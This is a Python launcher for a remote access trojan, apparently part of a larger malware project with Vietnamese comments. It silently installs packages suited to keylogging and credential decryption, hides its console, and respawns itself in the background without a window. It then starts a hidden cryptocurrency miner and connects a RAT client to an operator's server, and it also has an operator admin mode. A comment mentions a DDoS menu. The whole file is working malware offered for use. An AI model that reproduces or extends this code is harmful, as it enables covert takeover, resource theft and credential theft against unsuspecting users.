#!/usr/bin/env python3
import sys
import subprocess
import importlib
import os
import argparse
import platform

def install_missing_packages():
    required = {
        'psutil': 'psutil',
        'pynput': 'pynput',
        'PIL': 'pillow',
        'Crypto': 'pycryptodome',
        'rich': 'rich',
        'cloudscraper': 'cloudscraper',
        'win32crypt': 'pywin32',
        'prompt_toolkit': 'prompt_toolkit'
    }
    missing = []
    for mod, pkg in required.items():
        try:
            if mod == 'PIL':
                __import__('PIL')
            elif mod == 'Crypto':
                __import__('Crypto')
            elif mod == 'prompt_toolkit':
                __import__('prompt_toolkit')
            else:
                importlib.import_module(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"[*] Installing missing packages: {missing}")
        for pkg in missing:
            subprocess.run([sys.executable, '-m', 'pip', 'install', '--user', pkg])
        print("[+] Packages installed. Restarting...")
        os.execv(sys.executable, [sys.executable] + sys.argv)

install_missing_packages()

from core.config import ADMIN_IP, SERVER_PORT, ADMIN_KEY
from core.miner import ensure_miner
from core.helpers import hide_console
from rat.client import StitchClient
from rat.server_cli import AdminCLI

def is_rat_running():
    lock_file = os.path.join(os.environ.get('TEMP', ''), 'rat_runtime', 'rat.lock')
    return os.path.exists(lock_file)

def start_rat_background():
    script_path = os.path.abspath(__file__)
    if platform.system() == 'Windows':
        pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        # Tạo lock file trước khi chạy
        lock_dir = os.path.dirname(os.path.join(os.environ.get('TEMP', ''), 'rat_runtime', 'rat.lock'))
        os.makedirs(lock_dir, exist_ok=True)
        with open(os.path.join(lock_dir, 'rat.lock'), 'w') as f:
            f.write(str(os.getpid()))
        subprocess.Popen([pythonw, script_path, '--rat-only'], creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen([sys.executable, script_path, '--rat-only'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-server', '--server', action='store_true', dest='server')
    parser.add_argument('-key', '--key', dest='key')
    parser.add_argument('--rat-only', action='store_true', help=argparse.SUPPRESS)
    args = parser.parse_args()

    if args.rat_only:
        # Chạy RAT chính (không hiển thị console)
        try:
            hide_console()
        except:
            pass
        ensure_miner()
        client = StitchClient(ADMIN_IP, SERVER_PORT)
        client.run()
        return

    if args.server:
        if args.key != ADMIN_KEY:
            print("Invalid admin key.")
            sys.exit(1)
        admin = AdminCLI('0.0.0.0', SERVER_PORT)
        admin.start_server()
    else:
        # User mode: chạy RAT background nếu chưa chạy
        if not is_rat_running():
            start_rat_background()
            print("RAT client started in background.")
        else:
            print("RAT client is already running.")
        # Có thể hiển thị menu DDoS ở đây nếu muốn, nhưng tạm thời không
        sys.exit(0)

if __name__ == '__main__':
    main()